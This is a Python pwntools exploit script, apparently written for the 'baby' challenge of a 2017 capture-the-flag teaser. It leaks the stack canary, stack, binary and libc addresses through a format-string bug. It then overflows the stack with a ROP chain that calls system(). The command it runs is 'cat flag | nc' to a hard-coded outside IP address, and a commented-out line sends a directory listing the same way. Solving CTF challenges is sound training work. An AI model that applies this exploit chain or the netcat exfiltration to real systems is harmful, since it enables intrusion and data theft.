#!/usr/bin/env python

from pwn import *
import sys

def dostack(l, data):
	r.sendline("1")
	r.recvuntil('? ')
	r.sendline(str(l))
	r.send(data)
#	r.recvuntil('> ', timeout=1)

def dofmt(data):
	r.sendline('2')
	r.recvuntil('> ')
	r.sendline(data)
	leak = r.recvline().strip()
	r.recvuntil('> ')
	r.send('\n')
	r.recvuntil('> ')
	return leak

def doexit():
	r.sendline('4')

def doheap(option, chunk=0, chunksize=0, data = ''):
	r.sendline('3')
	r.recvuntil('> ')
	r.sendline(str(option))
	leak = ''
	if option == 1:
		r.sendline('1')
		r.recvuntil('> ')
		r.sendline(str(chunk))
		r.recvuntil('> ')
		r.sendline(str(chunksize))
		r.recvuntil('Allocated chunk %d @ ')
		leak = r.recvline().strip()
	if option == 2:
		r.sendline('2')
		r.recvuntil('> ')
		r.sendline(str(chunk))
		r.recvuntil('> ')
	if option == 3:
		r.sendline('3')
		r.recvuntil('> ')
		r.sendline(str(chunk))
		r.recvuntil('> ')
		r.sendline(str(chunksize))
		r.sendline(data)
		r.recvuntil('[')
		leak = r.recvuntil(']').strip(']')
		r.recvuntil('> ')
	if option == 4:
		r.sendline('4')
		r.recvuntil('[')
		leak = r.recvuntil(']').strip(']')
		r.recvuntil('> ')
	r.sendline('5')
	r.recvuntil('> ')
	return leak

def exploit(r):
	r.recvuntil('> ')

	canary = int(dofmt('%138$lx'), 16)
	log.info("Canary: " + hex(canary))
	stack = int(dofmt('%139$lx'), 16) - 0x440
	log.info("Stack: " + hex(stack))
	baby_base = int(dofmt('%132$lx'), 16) - 0x1255
	log.info("Start addr: " + hex(baby_base))
	libc_base = int(dofmt('%118$llx'), 16) - 0xcaa03
	log.info("Libc base: " + hex(libc_base))
	libc_system = libc_base + 0x000000000045390
	libc_binsh = libc_base + 0x18c177
	pop_rdi = baby_base + 0x0000000000001c8b

#	payload = 'ls -lha 2>&1 | nc 159.203.246.132 55555\x00'
	payload = 'cat flag 2>&1 | nc 159.203.246.132 55555\x00'
	payload += "A" * (1032 - len(payload))
	payload += p64(canary)
	payload += p64(0x424242)
	payload += p64(pop_rdi)
	payload += p64(stack)
	payload += p64(libc_system)

	dostack(len(payload), payload)
#	doexit()
	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/insomni2017teaser/baby/baby'])
        print util.proc.pidof(r)
        pause()
        exploit(r)